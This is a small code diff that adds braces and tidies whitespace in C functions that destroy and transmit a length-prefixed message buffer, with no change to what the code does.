@@ -127,12 +127,12 @@ PPACKAGE PackageNew( ) {
 }
 
 VOID PackageDestroy( PPACKAGE Package ) {
-    if ( ! Package )
+    if ( ! Package ) {
         return;
-
-    if ( ! Package->Buffer )
+    }
+    if ( ! Package->Buffer ) {
         return;
-
+    }
     mem_set( Package->Buffer, 0, Package->Length );
     LocalFree( Package->Buffer );
     Package->Buffer = NULL;
@@ -149,13 +149,14 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size ) {
         // writes package length to buffer
         Int32ToBuffer( Package->Buffer, Package->Length - sizeof( UINT32 ) );
 
-        if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) )
+        if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) ) {
             Success = TRUE;
-
+        }
         PackageDestroy( Package );
     }
-    else
+    else {
         Success = FALSE;
+    }
 
     return Success;
 }
